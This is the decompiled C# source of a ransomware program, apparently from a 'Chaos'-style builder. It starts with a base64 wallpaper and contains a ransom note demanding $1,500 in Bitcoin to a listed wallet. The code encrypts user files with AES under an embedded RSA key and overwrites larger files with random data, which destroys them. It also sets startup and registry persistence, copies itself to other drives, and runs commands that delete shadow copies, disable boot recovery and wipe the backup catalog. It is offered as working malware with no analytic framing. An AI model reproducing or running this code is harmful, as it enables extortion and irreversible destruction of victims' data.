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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"WANA CRY @rivator_max", "", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ",
		"Many of our customers have reported these sites to be fast and reliable:", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  3927dceo7pRq8hWZm25P4s11gw24EyGeJx"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>0JuRshok5+LHC+2dA9CFA4f5OLkfPNzvICUU8iny4em/JRJgH3bw68j2TcQA2P/MQMPvkbw87eZ3bl+4BNyCw1HJ5UkjroL0w8uQghDoCRFNT8NNAOq2N5hxNv8UsqE3peA/fSvLpW6h3SY8RNsoXuFOJd14wtNLzu6tgAPIw3E=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
